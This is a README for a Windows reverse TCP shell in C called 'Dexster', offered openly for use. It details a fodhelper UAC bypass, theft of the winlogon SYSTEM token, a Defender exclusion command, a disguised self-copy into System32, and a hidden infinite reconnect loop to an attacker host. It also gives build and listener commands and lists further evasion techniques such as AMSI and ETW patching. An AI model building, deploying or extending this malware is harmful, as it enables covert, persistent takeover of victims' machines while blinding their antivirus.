<div align="center">
<br/>
<br/>

<pre>
██████╗ ███████╗██╗  ██╗███████╗████████╗███████╗██████╗ 
██╔══██╗██╔════╝╚██╗██╔╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██║  ██║█████╗   ╚███╔╝ ███████╗   ██║   █████╗  ██████╔╝
██║  ██║██╔══╝   ██╔██╗ ╚════██║   ██║   ██╔══╝  ██╔══██╗
██████╔╝███████╗██╔╝ ██╗███████║   ██║   ███████╗██║  ██║
╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
</pre>

<h3>Reverse TCP Shell &nbsp;·&nbsp; Windows Edition &nbsp;·&nbsp; <code>v4.5</code></h3>
<p><em>From a regular user to <strong>NT AUTHORITY\SYSTEM</strong> — silently, automatically, no prompts.</em></p>

<br/>

<img src="https://img.shields.io/badge/Language-C-A8B9CC?style=for-the-badge&logo=c&logoColor=white"/>
&nbsp;
<img src="https://img.shields.io/badge/Platform-Windows%20x64-0078D4?style=for-the-badge&logo=windows&logoColor=white"/>
&nbsp;
<img src="https://img.shields.io/badge/Privilege-NT%20AUTHORITY%5C%5CSYSTEM-DC143C?style=for-the-badge&logo=windows-terminal&logoColor=white"/>
&nbsp;
<img src="https://img.shields.io/badge/Shell-PowerShell-5391FE?style=for-the-badge&logo=powershell&logoColor=white"/>
&nbsp;
<img src="https://img.shields.io/badge/UAC-Bypassed-FF6B35?style=for-the-badge&logo=shield&logoColor=white"/>
&nbsp;
<img src="https://img.shields.io/badge/Use-Authorized%20Testing%20Only-FFA500?style=for-the-badge"/>

<br/><br/>

<table>
<tr>
<td align="center">🔓<br/><strong>UAC Bypass</strong><br/><sub>fodhelper technique</sub></td>
<td align="center">🎭<br/><strong>Token Steal</strong><br/><sub>winlogon impersonation</sub></td>
<td align="center">🛡️<br/><strong>AV Evasion</strong><br/><sub>Defender exclusion</sub></td>
<td align="center">🔁<br/><strong>Auto Reconnect</strong><br/><sub>infinite retry loop</sub></td>
<td align="center">👻<br/><strong>Fully Hidden</strong><br/><sub>no window, no trace</sub></td>
</tr>
</table>

<br/>

</div>

> [!CAUTION]
> **For AUTHORIZED penetration testing and security research ONLY.**
> Using this against systems you do not own or lack explicit written permission to test is a **criminal offence** in most jurisdictions.

<br/>

---

<br/>

<p align="center">
  <a href="#-what-is-a-reverse-shell"><b>What is a Reverse Shell?</b></a> &nbsp;·&nbsp;
  <a href="#-files"><b>Files</b></a> &nbsp;·&nbsp;
  <a href="#-privilege-chain"><b>Privilege Chain</b></a> &nbsp;·&nbsp;
  <a href="#%EF%B8%8F-how-it-works"><b>How It Works</b></a> &nbsp;·&nbsp;
  <a href="#-av--defender-detection"><b>AV Detection</b></a> &nbsp;·&nbsp;
  <a href="#%EF%B8%8F-building"><b>Building</b></a> &nbsp;·&nbsp;
  <a href="#-usage"><b>Usage</b></a> &nbsp;·&nbsp;
  <a href="#-listener-setup"><b>Listener</b></a> &nbsp;·&nbsp;
  <a href="#%EF%B8%8F-configuration"><b>Config</b></a> &nbsp;·&nbsp;
  <a href="#-full-execution-flow"><b>Summary</b></a>
</p>

<br/>

---

<br/>

## 💡 What is a Reverse Shell?

A **reverse shell** inverts the traditional attacker → target connection. Instead, the **target reaches out to the attacker**. This bypasses most corporate firewalls and NAT configurations since outbound TCP is almost never blocked.

<br/>

<div align="center"><pre>
+---------------------------+      TCP Handshake      +---------------------------+
|      TARGET MACHINE       | ----------------------> |     ATTACKER MACHINE      |
|                           |                         |                           |
|   reverse_shell.exe       | <--  PowerShell I/O  -- |   nc -lvnp [PORT]         |
|   (running as SYSTEM)     |                         |   (full shell access)     |
+---------------------------+                         +---------------------------+
</pre></div>

<br/>

---

<br/>

## 📁 Files

<div align="center">

| &nbsp; | File | Description |
|:---:|:---|:---|
| 🔴 | `reverse_shell_Win-x64.c` | **Main payload** — UAC bypass + SYSTEM escalation + shell loop |
| 📄 | `manifest.xml` | Windows application manifest — execution level set to `asInvoker` |
| 🔧 | `manifest.rc` | Resource script — embeds the manifest into the compiled binary |

</div>

<br/>

---

<br/>

## 🔑 Privilege Chain

<br/>

<div align="center"><pre>
+-------------------------------------------------------+
|   Regular User  (medium integrity)                    |
|   -- standard desktop session                         |
+-------------------------------------------------------+
                          |
              [1] fodhelper UAC Bypass
                  * writes HKCU registry key
                  * launches fodhelper.exe (auto-elevated)
                  * fodhelper re-executes us as Admin
                  * zero prompts shown to user
                          |
                          v
+-------------------------------------------------------+
|   Administrator  (high integrity)                     |
|   -- elevated token, UAC bypassed                     |
+-------------------------------------------------------+
                          |
              [2] Token Impersonation
                  * enable SeDebugPrivilege
                  * open winlogon.exe (always SYSTEM)
                  * steal + duplicate its token
                  * spawn processes under that token
                          |
                          v
+-------------------------------------------------------+
|   NT AUTHORITY\SYSTEM  (highest on Windows)           |
|   -- above Admin, no restrictions                     |
|   -- can access SAM, LSA, any process                 |
+-------------------------------------------------------+
</pre></div>

<br/>

---

<br/>

## ⚙️ How It Works

<br/>

<details>
<summary><h3>&nbsp;🔓 &nbsp;Stage 1 &nbsp;—&nbsp; UAC Bypass &nbsp;<code>fodhelper technique</code></h3></summary>

<br/>

> **Goal:** Elevate from a standard user to Admin **without showing any UAC prompt.**

**The attack surface:** `fodhelper.exe` is a Microsoft-signed Windows binary marked `autoElevate: true` in its own manifest. Windows silently elevates it with no prompt. Before opening its UI, `fodhelper` checks a user-writable registry key for a command to run:

```
HKCU\Software\Classes\ms-settings\Shell\Open\command
    (Default)        = "C:\path\to\our\exe.exe"
    DelegateExecute  = ""        <-- must exist to trigger the hijack
```

**Execution flow:**

<div align="center"><pre>
[1] GetModuleFileNameA()  -->  get our own full path
             |
[2] RegCreateKeyExA()     -->  create the ms-settings key in HKCU
             |
[3] RegSetValueExA()      -->  write quoted exe path as default value
             |                 (quoted to handle paths with spaces)
[4] RegSetValueExA()      -->  write empty DelegateExecute value
             |
[5] ShellExecuteA("open", "fodhelper.exe")
             |             Windows auto-elevates fodhelper (no UAC prompt)
             |             fodhelper reads the key, executes our exe as Admin
             |
[6] Sleep(2000)           -->  give elevated child time to start
             |
[7] RegDeleteTreeA()      -->  wipe the ms-settings key (no evidence)
             |
[8] ExitProcess(0)        -->  non-elevated instance exits
</pre></div>

> **Why `asInvoker` in the manifest?** — A `requireAdministrator` manifest causes Windows to show a UAC prompt *before the binary even starts*, defeating the bypass entirely. `asInvoker` allows the exe to launch as a normal user so the bypass code can handle elevation internally.

> **Requirement:** Target user must be in the local **Administrators group**. This bypasses the *prompt*, not the group membership check.

<br/>

</details>

---

<details>
<summary><h3>&nbsp;🔑 &nbsp;Stage 2 &nbsp;—&nbsp; Enable <code>SeDebugPrivilege</code></h3></summary>

<br/>

> **Goal:** Unlock the ability to open handles to processes owned by other accounts — including SYSTEM.

Every Admin process has `SeDebugPrivilege` **assigned but disabled** by default. Without enabling it, `OpenProcess` on any SYSTEM-owned process (like `winlogon.exe`) returns `ERROR_ACCESS_DENIED`.

```c
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token);
LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid);
AdjustTokenPrivileges(token, FALSE, &tp, ...);
// SeDebugPrivilege is now ENABLED
// OpenProcess on any PID now succeeds
```

<br/>

</details>

---

<details>
<summary><h3>&nbsp;🎭 &nbsp;Stage 3 &nbsp;—&nbsp; SYSTEM Token Impersonation</h3></summary>

<br/>

> **Goal:** Obtain a usable `NT AUTHORITY\SYSTEM` primary token from a process that already runs as SYSTEM.

`winlogon.exe` always runs as SYSTEM. We enumerate it, open it, and duplicate its token:

<div align="center"><pre>
CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)
              |
              v  enumerate all processes
         find "winlogon.exe"  -->  get PID
              |
              v
OpenProcess(PROCESS_QUERY_INFORMATION, winlogon_pid)
              |
              v
OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY)
              |
              v
DuplicateTokenEx(
    token,
    TOKEN_ALL_ACCESS,
    NULL,
    SecurityImpersonation,
    TokenPrimary,         <-- PRIMARY required for CreateProcessWithTokenW
    &dup_token
)
              |
              v
    dup_token = fully usable SYSTEM token
</pre></div>

<br/>

</details>

---

<details>
<summary><h3>&nbsp;🛡️ &nbsp;Stage 4 &nbsp;—&nbsp; SYSTEM-Only Setup &nbsp;<sub>(runs once, skipped if token is NULL)</sub></h3></summary>

<br/>

> **Goal:** Suppress AV scanning and plant the payload in a trusted system location.

**① Defender Exclusion** *(PowerShell, hidden, running as SYSTEM)*

```powershell
Add-MpPreference -ExclusionPath "C:\Windows\System32"
```

Adds `System32` to the MpPreference exclusion list. Defender's real-time protection engine will skip scanning any file written to that path. Sleeps 1.5 seconds after to allow the policy change to propagate before copying.

**② Self-Copy into System32**

<div align="center"><pre>
[current exe path]
        |
        v
C:\Windows\System32\WindowsHostService.exe
</pre></div>

Drops a copy under a name that blends with legitimate Windows service binaries. Overwrites if already present.

<br/>

</details>

---

<details>
<summary><h3>&nbsp;🔁 &nbsp;Stage 5 &nbsp;—&nbsp; Infinite Reconnect Loop</h3></summary>

<br/>

> **Goal:** Maintain persistent access — reconnect automatically whenever the connection drops.

<div align="center"><pre>
+------------------------------------------------------+
|            RECONNECT LOOP  (infinite)                |
|                                                      |
|  sock = connect(DEFAULT_HOST, DEFAULT_PORT)          |
|                                                      |
|  +-- Connection FAILED --------------------------+   |
|  |   sleep(RETRY_DELAY_MS)  -->  retry           |   |
|  +------------------------------------------------+   |
|                                                      |
|  +-- Connection SUCCESS -------------------------+   |
|  |                                               |   |
|  |   SYSTEM token valid:                         |   |
|  |     CreateProcessWithTokenW(system_token, ..) |   |
|  |     --> Shell as NT AUTHORITY\SYSTEM          |   |
|  |                                               |   |
|  |   No token (fallback):                        |   |
|  |     CreateProcessA("powershell.exe ..")       |   |
|  |     --> Shell as Administrator                |   |
|  |                                               |   |
|  |   stdin / stdout / stderr  <-->  socket       |   |
|  |   WaitForSingleObject --> shell exits         |   |
|  +------------------------------------------------+   |
+------------------------------------------------------+
</pre></div>

PowerShell is launched with `CREATE_NO_WINDOW | SW_HIDE` — no window, no taskbar entry, no visible process to a casual observer.

<br/>

</details>

<br/>

---

<br/>

## ⚠️ AV / Defender Detection

<br/>

> [!WARNING]
> Running the compiled binary as-is **will be flagged** by Windows Defender and most endpoint security products. This section explains the detection vectors at a technical level and documents the mitigations used — and those that are not.

<br/>

### Why Defender Flags It

<br/>

**① Static Signature Detection (PE scanning)**

When the binary is written to disk, Defender's scanning engine evaluates the **Portable Executable (PE) file** against its signature database. Several attributes trigger a match:

- **Import Address Table (IAT) fingerprint** — The combination of `WSASocketA`, `CreateProcessWithTokenW`, `ShellExecuteA`, and `RegSetValueExA` in the IAT directly matches known RAT/reverse shell behavioral profiles
- **Plaintext strings in `.rdata`** — The hardcoded C2 hostname, registry key paths (`ms-settings\Shell\Open\command`), and process name (`winlogon.exe`) exist as unencrypted string literals in the binary's read-only data section — trivially detectable by signature scanners
- **PE entropy** — If the binary is packed or encrypted, the section entropy will be near 8.0 (maximum), which alone triggers heuristic flags on many AV engines

**② Behavioral Heuristics & Emulation**

Defender's lightweight emulator pre-executes a controlled number of instructions in a sandboxed environment before allowing the file to run. It identifies:

- **UAC bypass pattern (MITRE ATT&CK T1548.002)** — Writing to `HKCU\Software\Classes\ms-settings\Shell\Open\command` immediately followed by executing `fodhelper.exe` is a documented and fingerprinted TTP in Defender's behavioral ruleset
- **Token impersonation chain** — The sequence `OpenProcess → OpenProcessToken → DuplicateTokenEx → CreateProcessWithTokenW` is characteristic of token theft attacks (MITRE T1134.001) and triggers behavioral alerts

**③ AMSI (Antimalware Scan Interface)**

When PowerShell is spawned, the **AMSI provider** (`amsi.dll`) is loaded into the PowerShell process. Every script block, command string, and encoded command is passed to `AmsiScanBuffer()` before execution. The `Add-MpPreference -ExclusionPath` cmdlet called from a non-interactive, `SW_HIDE` PowerShell process is a high-confidence malicious indicator that AMSI will catch even if the binary itself passes static analysis.

**④ ETW (Event Tracing for Windows) Telemetry**

Enterprise-grade EDR products (Microsoft Defender for Endpoint, CrowdStrike, SentinelOne) subscribe to ETW kernel-mode providers. `DuplicateTokenEx` and `CreateProcessWithTokenW` calls emit ETW events that are correlated at the kernel level — invisible to user-mode evasion techniques — and generate alerts independent of any file scanning.

<br/>

### Mitigations Used in This Binary

<br/>

| Mitigation | Implemented | Effect |
|:---|:---:|:---|
| Defender exclusion via `Add-MpPreference` | ✅ | Blinds real-time scanning for `System32` after SYSTEM is obtained |
| `CREATE_NO_WINDOW \| SW_HIDE` for all spawned processes | ✅ | No visible window or taskbar entry |
| `asInvoker` manifest (no UAC prompt triggers) | ✅ | Binary launches silently as normal user |
| Registry cleanup after UAC bypass | ✅ | `ms-settings` key deleted immediately — no forensic artifact |

<br/>

### What Is Not Implemented (Further Hardening)

<br/>

| Technique | What It Does |
|:---|:---|
| **Dynamic API resolution** | Resolve `advapi32`/`ws2_32` exports at runtime via `GetProcAddress` — removes all function names from the IAT, defeating static import-based signatures |
| **String obfuscation (XOR/AES)** | Encrypt all string literals at compile time, decrypt at runtime — removes plaintext C2 host, registry paths, and process names from `.rdata` |
| **AMSI patching** | Overwrite `AmsiScanBuffer` in the spawned PowerShell process memory to always return `AMSI_RESULT_CLEAN` — blinds PowerShell's AMSI integration entirely |
| **ETW patching** | Patch `EtwEventWrite` in `ntdll.dll` to suppress telemetry events — defeats kernel-level EDR correlation |
| **Syscall stubs (direct syscalls)** | Bypass user-mode API hooks by calling Windows kernel functions directly via `syscall` — defeats EDR hooks placed inside `ntdll.dll` |
| **Compile-time PE variation** | Randomize function order, section names, PE timestamps, and checksums on each build — defeats hash-based static signatures |
| **Code signing** | Sign the binary with an Authenticode certificate — significantly lowers AV trust scoring, some products whitelist signed binaries entirely |

<br/>

---

<br/>

## 🛠️ Building

<br/>

> **Requirements:** [MSYS2](https://www.msys2.org/) with `mingw-w64` toolchain — provides both `gcc` and `windres`.

<br/>

```bash
# Step 1 — compile the manifest resource
windres manifest.rc -o manifest.o

# Step 2 — compile and link the final binary
gcc reverse_shell_system.c manifest.o -o reverse_shell_system.exe -lws2_32 -ladvapi32 -lshell32 -mwindows
```

<br/>

<div align="center">

| Flag | Links Against | Why It's Needed |
|:---:|:---|:---|
| `-lws2_32` | `ws2_32.dll` | All Winsock2 socket functions (`WSASocket`, `connect`, `send`, etc.) |
| `-ladvapi32` | `advapi32.dll` | Registry, tokens, privileges (`OpenProcessToken`, `AdjustTokenPrivileges`) |
| `-lshell32` | `shell32.dll` | `ShellExecuteA` — only API that can launch auto-elevating binaries |
| `-mwindows` | — | GUI subsystem — **no console window spawns at any point** |

</div>

<br/>

---

<br/>

## 🚀 Usage

<br/>

**Default** *(host + port hardcoded in source):*

```powershell
.\reverse_shell_system.exe
```

**Custom host and port:**

```powershell
.\reverse_shell_system.exe <ATTACKER_IP_OR_HOST> <PORT>
```

> [!NOTE]
> No arguments needed for normal use — host and port are compiled in via `#define` at the top of the source file.

<br/>

---

<br/>

## 📡 Listener Setup

<br/>

> Start your listener **before** running the payload. The target connects back on launch.

```bash
# netcat
nc -lvnp <PORT>

# ncat (Nmap — recommended)
ncat -lvnp <PORT>
```

<br/>

**Verify privilege on connection:**

```powershell
whoami
# nt authority\system

whoami /priv
# All privileges listed -- SeDebugPrivilege, SeTcbPrivilege, etc.

whoami /groups
# NT AUTHORITY\SYSTEM, BUILTIN\Administrators, ...
```

<br/>

---

<br/>

## ⚙️ Configuration

<br/>

Edit these defines at the top of `reverse_shell_system.c` before compiling:

<br/>

<div align="center">

| `#define` | Default Value | What It Controls |
|:---:|:---|:---|
| `DEFAULT_HOST` | `example.host.of.yours` | Attacker IP or hostname to connect back to |
| `DEFAULT_PORT` | `12345` | TCP port of the attacker's listener |
| `RETRY_DELAY_MS` | `2000` | Milliseconds to wait between reconnect attempts |
| `MAX_RETRIES` | `0` | `0` = retry forever &nbsp;·&nbsp; `N` = give up after N failures |

</div>

<br/>

---

<br/>

## 📊 Full Execution Flow

<br/>

<div align="center"><pre>
  reverse_shell_system.exe  (launched as regular user)
                  |
                  v
+-------------------------------------------------------------------+
|  STAGE 1 -- UAC BYPASS                                           |
|                                                                   |
|  already admin? --YES--> skip to Stage 2                         |
|        | NO                                                       |
|        v                                                          |
|  write HKCU ms-settings registry key                             |
|  ShellExecuteA("fodhelper.exe")                                   |
|  --> Windows auto-elevates fodhelper (no UAC prompt)             |
|  --> fodhelper re-launches this exe as Admin  ----------------+  |
|  sleep 2s --> wipe registry key --> ExitProcess(0)            |  |
+-------------------------------------------------------------------+  |
                                                                   |
+-------------------------------------------------------------------+  |
|  STAGE 2 -- SeDebugPrivilege              (elevated instance) <--+  |
|  AdjustTokenPrivileges --> privilege enabled                         |
+------------------------------------------+---------------------------+
                                           |
+------------------------------------------v---------------------------+
|  STAGE 3 -- TOKEN STEAL                                              |
|  find winlogon.exe --> OpenProcess --> DuplicateTokenEx              |
|  result: PRIMARY SYSTEM token (or NULL if access denied)             |
+------------------------------------------+---------------------------+
                                           |
+------------------------------------------v---------------------------+
|  STAGE 4 -- SYSTEM SETUP  (skipped entirely if token == NULL)        |
|                                                                       |
|  [1] PowerShell (SYSTEM, hidden):                                    |
|      Add-MpPreference -ExclusionPath "C:\Windows\System32"           |
|      Sleep 1500ms                                                    |
|                                                                       |
|  [2] CopyFileA:                                                       |
|      this exe --> C:\Windows\System32\WindowsHostService.exe         |
+------------------------------------------+---------------------------+
                                           |
+------------------------------------------v---------------------------+
|  STAGE 5 -- RECONNECT LOOP  (infinite)                               |
|                                                                       |
|  loop:                                                                |
|    connect(HOST, PORT)                                                |
|      success + SYSTEM token --> PowerShell as NT AUTHORITY\SYSTEM    |
|      success + no token     --> PowerShell as Administrator           |
|      failed                 --> sleep 2s, retry                      |
+-----------------------------------------------------------------------+
</pre></div>

<br/>

---

<br/>

<div align="center">

<img src="https://img.shields.io/badge/Built%20with-C-A8B9CC?style=flat-square&logo=c"/>
&nbsp;
<img src="https://img.shields.io/badge/Target-Windows%2010%2F11-0078D4?style=flat-square&logo=windows"/>
&nbsp;
<img src="https://img.shields.io/badge/Compiler-MinGW--w64-FF6B35?style=flat-square"/>

<br/><br/>

<em>Dexster &nbsp;·&nbsp; Reverse TCP Shell &nbsp;·&nbsp; v4.5 &nbsp;·&nbsp; Built by notphoenixx &nbsp;❤️</em>

<br/>

</div>
